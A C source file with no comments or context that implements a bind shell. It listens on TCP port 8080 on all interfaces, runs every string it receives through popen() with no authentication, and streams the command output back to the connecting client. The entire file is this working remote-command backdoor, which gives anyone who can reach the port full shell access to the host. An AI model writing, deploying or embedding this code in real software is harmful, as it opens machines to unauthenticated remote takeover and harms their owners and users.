#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 8080
#define MAX_COMMAND_SIZE 1024

int main(int argc, char const *argv[]) {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[MAX_COMMAND_SIZE] = {0};
    FILE *fp;

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while (1) {
        printf("\nListening for incoming connection...\n");
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }

        printf("Connection accepted.\n");
        while (1) {
            int valread;
            valread = read(new_socket, buffer, MAX_COMMAND_SIZE);
            if (valread <= 0) break;

            printf("Received command: %s", buffer);
            fp = popen(buffer, "r");
            if (fp == NULL) {
                printf("Failed to run command\n");
                exit(EXIT_FAILURE);
            }

            char response[MAX_COMMAND_SIZE] = {0};
            while (fgets(response, MAX_COMMAND_SIZE, fp)) {
                send(new_socket, response, strlen(response), 0);
                printf("%s", response);
                memset(response, 0, MAX_COMMAND_SIZE);
            }

            pclose(fp);
            send(new_socket, "\n", 1, 0);
            printf("\nCommand executed.\n");
        }
        close(new_socket);
        printf("Connection closed.\n");
    }
    return 0;
}
